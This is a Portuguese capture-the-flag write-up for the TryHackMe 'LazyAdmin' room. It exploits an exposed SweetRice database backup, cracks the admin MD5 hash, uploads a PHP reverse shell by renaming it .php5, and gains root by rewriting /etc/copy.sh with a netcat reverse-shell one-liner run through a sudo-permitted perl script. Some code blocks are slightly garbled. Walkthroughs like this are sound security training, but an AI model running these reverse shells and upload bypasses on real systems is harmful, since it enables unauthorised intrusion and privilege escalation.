> [!WARNING]
> This writeup is in portuguese. For the english version, please follow [this link](./Writeup%20(EN-US).md).

# [LazyAdmin](https://tryhackme.com/room/lazyadmin)

<a href="https://tryhackme.com/room/lazyadmin"><figure><img src="./assets/logo.jpeg" width="175" title="tryhackme.com - © TryHackMe"></figure></a>

> Easy linux machine to practice your skills

Capture The Flag original disponível em [Try Hack Me](https://tryhackme.com/room/lazyadmin), feito por [MrSeth6797](https://tryhackme.com/p/MrSeth6797).

Dificuldade: `Fácil`

Resolvido em: `2026/04/25`

# Conteúdos

- [LazyAdmin](#lazyadmin)
- [Conteúdos](#conteúdos)
- [Writeup](#writeup)
   * [Sumário](#sumário)
   * [Reconhecimento](#reconhecimento)
   * [Exploração](#exploração)
   * [Escalação de Privilégios](#escalação-de-privilégios)

# Writeup

## Sumário

Usando vulnerabilidades no servidor `sweetrice`, a máquina é quebrada.

## Reconhecimento

Após a abertura da máquina, adicionei seu IP ao arquivo `/etc/hosts` a fim de facilitar o acesso, com o sinônimo `la.net`. Para verificar que tudo está funcionando:

```bash
$ ping -c 3 la.net
PING la.net (<MACHINE_IP>) 56(84) bytes of data.
64 bytes from la.net (<MACHINE_IP>): icmp_seq=1 ttl=62 time=144 ms
64 bytes from la.net (<MACHINE_IP>): icmp_seq=2 ttl=62 time=140 ms
64 bytes from la.net (<MACHINE_IP>): icmp_seq=3 ttl=62 time=140 ms

--- la.net ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms
rtt min/avg/max/mdev = 139.544/141.077/143.546/1.762 ms
```

Com isso, iniciei realizando um simples mapeamento de portas com `nmap`[^nmap] para descobrir o que estava atualmente aberto:

```bash
$ nmap -T4 la.net
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-25 15:06 UTC
Nmap scan report for la.net (<MACHINE_IP>)
Host ot shown).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Apenas um ssh e http. Sem muitas opções de entrada no ssh (afinal não possuo usuário ou senha) decidi ver o que o http tinha a oferecer:

<figure><img src="./assets/lanet_1.png" title="la.net landing page"></figure>

Bem, é apenas a página padrão de um servidor Apache2. Sem nada mais no site em si, recorri ao `gobuster`[^gobuster] para verificar a existência de outros diretórios (com uma das wordlists padrões do kali[^wl-dirl23med]):

```bash
$ gobuster dir -u la.net -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
...
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 11321]
/content              (Status: 301) [Size: 302] [--> http://la.net/content/]
```

Existe outra página! Verificando `/content`...

<figure><img src="./assets/lanet_2.png" title="la.net/content"></figure>

Também outra página padrão, desta vez para o serviço `sweetrice`. 

## Exploração

Ainda sem nenhuma informação para o ssh, decidi buscar por vulnerabilidades no `sweetrice` usando `searchsploit`:[^srchspl]

```bash
$ searchsploit sweetrice
------------------------------------------- ---------------------------------
 Exploit Title                             |  Path
------------------------------------------- ---------------------------------
SweetRice 0.5.3 - Remote File Inclusion    | php/webapps/10246.txt
SweetRice 0.6.7 - Multiple Vulnerabilities | php/webapps/15413.txt
SweetRice 1.5.1 - Arbitrary File Download  | php/webapps/40698.py
SweetRice 1.5.1 - Arbitrary File Upload    | php/webapps/40716.py
SweetRice 1.5.1 - Backup Disclosure        | php/webapps/40718.txt
SweetRice 1.5.1 - Cross-Site Request Forge | php/webapps/40692.html
SweetRice 1.5.1 - Cross-Site Request Forge | php/webapps/40700.html
SweetRice < 0.6.4 - 'FCKeditor' Arbitrary  | php/webapps/14184.txt
------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Os exploits *Backup Disclosure* (40718), *Arbitrary File Upload* (40716) e *Arbitrary File Download* (40698) parecem todos promissores para obter mais informações. Dito isso, decidir testar o 40718 primeiro já que poderia fornecer informações de acesso para o sistema `sweetrice`.

```bash
$ cat /usr/share/exploitdb/exploits/php/webapps/40718.txt 
Title: SweetRice 1.5.1 - Backup Disclosure
Application: SweetRice
Versions Affected: 1.5.1
Vendor URL: http://www.basic-cms.org/
Software URL: http://www.basic-cms.org/attachment/sweetrice-1.5.1.zip
Discovered by: Ashiyane Digital Security Team
Tested on: Windows 10
Bugs: Backup Disclosure
Date: 16-Sept-2016


Proof of Concept :

You can access to all mysql backup and download them from this directory.
http://localhost/inc/mysql_backup

and can access to website files backup from:
http://localhost/SweetRice-transfer.zip  
```

Bem simples! Podemos ver arquivos diretamente se os diretórios não foram devidamente configurados (eu me pergunto se um Lazy Admin iria configurá-los...). Entrando em `la.net/content/inc`:

<figure><img src="./assets/lanet_3.png" title="la.net/content/inc"></figure>
<figure><img src="./assets/lanet_4.png" title="Exposed db backup"></figure>

Realmente, o backup da database estava completamente exposto! Após baixar o arquivo e bisbilhotar dentro dele, encontrei a seguinte linha:

```
...
14 => 'INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\"name\\";s:25:\\"Lazy Admin&#039;s Website\\";s:6:\\"author\\";s:10:\\"Lazy Admin\\";s:5:\\"title\\";s:0:\\"\\";s:8:\\"keywords\\";s:8:\\"Keywords\\";s:11:\\"description\\";s:11:\\"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:\\"close\\";i:1;s:9:\\"close_tip\\";
...
```

Que pode ser traduzida para:

- name: Lazy Admin's Website
- author: Lazy Admin
- title: null
- keywords: Keywords
- description: Description
- admin: manager
- passwd: 42f749ade7f9e195bf475f37a44cafcb
- close: close_tip

Ótimo, adquiri um usuário (`manager`) e uma senha (`42f749ade7f9e195bf475f37a44cafcb`). Dito isso, a senha está em formato hash, então precisei primeiramente encontrar o texto pleno. Com `hashid`[^hashid] verifiquei o formato:

```bash
$ hashid 42f749ade7f9e195bf475f37a44cafcb                               
Analyzing '42f749ade7f9e195bf475f37a44cafcb'
[+] MD2 
[+] MD5 
[+] MD4 
[+] Double MD5 
...
```

E com `hashcat`[^hashcat], usando a lista de senhas `rockyou`[^rockyou], um ataque de força bruta rapidamente encontra uma senha:

```bash
$ hashcat -a 0 -m 0 '42f749ade7f9e195bf475f37a44cafcb' /usr/share/wordlists/rockyou.txt.gz
...
42f749ade7f9e195bf475f37a44cafcb:Password123
                                                       
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 42f749ade7f9e195bf475f37a44cafcb
...
Started: Sat Apr 25 17:28:00 2026
Stopped: Sat Apr 25 17:28:23 2026
```

A senha é, então, Password123. Agora, só falta um painel de acesso! Usei novamente o `gobuster`[^gobuster] para encontrar diretórios, desta vez dentro do `sweetrice` (`la.net/content`):

```bash
$ gobuster dir -u la.net/content -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
...
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 309] [--> http://la.net/content/images/]                                                                       
/index.php            (Status: 200) [Size: 2192]
/license.txt          (Status: 200) [Size: 15410]
/js                   (Status: 301) [Size: 305] [--> http://la.net/content/js/]                                                                           
/changelog.txt        (Status: 200) [Size: 18013]
/inc                  (Status: 301) [Size: 306] [--> http://la.net/content/inc/]                                                                          
/as                   (Status: 301) [Size: 305] [--> http://la.net/content/as/]                                                                           
/_themes              (Status: 301) [Size: 310] [--> http://la.net/content/_themes/]                                                                      
/attachment           (Status: 301) [Size: 313] [--> http://la.net/content/attachment/]
```

Além do `/inc` que utilizei mais cedo, o outro diretório relevante da lista é `/as`, que revela um painel de acesso de administrador:

<figure><img src="./assets/lanet_5.png" title="la.net/content/as"></figure>

Que, com o usuário e senha previamente adquiridos, permitem entrada no painel de administração do website por completo:

<figure><img src="./assets/lanet_6.png" title="Admin panel"></figure>

Com tantas abas, demorou um pouco para encontrar um ponto de acesso, mas finalmente, no `Media Center` é possível realizar upload de arquivos arbitrariamente!

<figure><img src="./assets/lanet_7.png" title="Media center"></figure>

A melhor parte, que descobri após enviar um arquivo ao servidor, foi que os arquivos permanecem clicáveis e, então, facilmente executáveis:

<figure><img src="./assets/lanet_8.png" title="Clickable files"></figure>

Com isso, decidi usar um dos reverse shells[^rv] disponíveis em [revshells.com](https://revshells.com) para obter um terminal na máquina. Bem, como o servidor possui PHP instalado, decidi usar o *PHP PentestMonkey* para realizar o trabalho.

Apenas realizar o upload do arquivo não foi suficiente, uma vez que o upload da extensão `.php` estava bloqueado. Mas a extensão `.php5` não foi bloquada:

<figure><img src="./assets/lanet_9.png" title=".php5"></figure>

Então coloquei o `netcat`[^nc] para ouvir dentro das configurações do revshell:

```bash
$ nc -lvnp 1234
```

E, quando cliquei no arquivo, o servidor executou o revshell!

```bash
$ whoami
www-data
```

## Escalação de Privilégios

Uma bisbilhotada simples pelos arquivos revelou-me a bandeira de usuário:

```bashpython`[^py] estava instalado na máquina, rapidamente elevei o terminal:

```bash
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@THM-Chal:/$ whoami
www-data
```

E, em seguida, verifiquei as permissões do sistema em relação ao `sudo`:

```bash
www-data@THM-Chal:/$ sudo -l
sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

Temos duas coisas disponíveis para serem executadas: o `perl`[^perl] e um script `.pl` (a extensão padrão para `perl`). De instinto, eu tentei executar um comando de elevação no `perl` (providenciado em [GTFObins](https://gtfobins.org/)) mas, infelizmente, não foi tão simples:

```bash
www-data@THM-Chal:/$ sudo perl -e 'exec "/bin/sh"'
[sudo] password for www-data:
```

Então segui para a próxima opção, verificar o script providenciado.

```bash
www-data@THM-Chal:/$ cat /home/itguy/backup.pl
cat /home/itguy/backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```

Bem, o script em si apenas executa com `perl` uma linha. Ele invoca um console e executa outro script, `/etc/copy.sh`. Huh! Então ei de ver o que temos em `/etc/copy.sh`:

```bash
www-data@THM-Chal:/etc$ ls -l copy.sh
ls -l copy.sh
-rw-r--rwx 1 root root 81 Nov 29  2019 copy.sh

www-data@THM-Chal:/etc$ cat copy.sh
cat copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
```

Literalmente um reverse shell[^rv], e como tal é executado pelo `perl`, eu consigo escalar os privilégios desta forma! Antes disso, tenho que alterar o script para receber meu IP:

```bash
www-data@THM-Chal:/etc$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <MY_MACHINE>
ot shown 5554 >/tmp/f" > copy.sh
www-data@THM-Chal:/etc$ cat copy.sh
cat copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <MY_MACHINE>
ot shown 5554 >/tmp/f
```

Abrir o `netcat`[^nc] na porta `5554` na minha máquina:

```bash
$ nc -lvnp 5554
```

E então rodar o `perl` para executar o script `/home/itguy/backup.pl` com privilégios de `sudo`:

```bash
www-data@THM-Chal:/$ sudo /usr/bin/perl /home/itguy/backup.pl
```

Com isso, consegui outro reverse shell, agora escalado com privilégios de root:

```bash
$ nc -lvnp 5554
listening on [any] 5554 ...
connect to [<MY_MACHINE>
ot shown] from (UNKNOWN) [<MACHINE_IP>] 55744
# whoami 
root
```

Agora, basta adquirir a bandeira de root:

```bash
# pwd
/root
# cat root.txt
<FLAG_ROOT>
```

[^nmap]: https://github.com/nmap/nmap
[^gobuster]: https://github.com/OJ/gobuster
[^srchspl]: https://www.exploit-db.com/searchsploit
[^wl-dirl23med]: https://gitlab.com/kalilinux/packages/dirbuster/-/blob/37f2e9bb1c50bee238aa50d795cf853bb28b2997/directory-list-2.3-medium.txt
[^nc]: https://nc110.sourceforge.io/
[^rv]: https://en.wikipedia.org/wiki/Shell_shoveling
[^hashid]: https://psypanda.github.io/hashID/
[^hashcat]: https://hashcat.net/hashcat/
[^rockyou]: https://weakpass.com/wordlists/rockyou.txt
[^py]: https://www.python.org/
[^perl]: https://www.perl.org/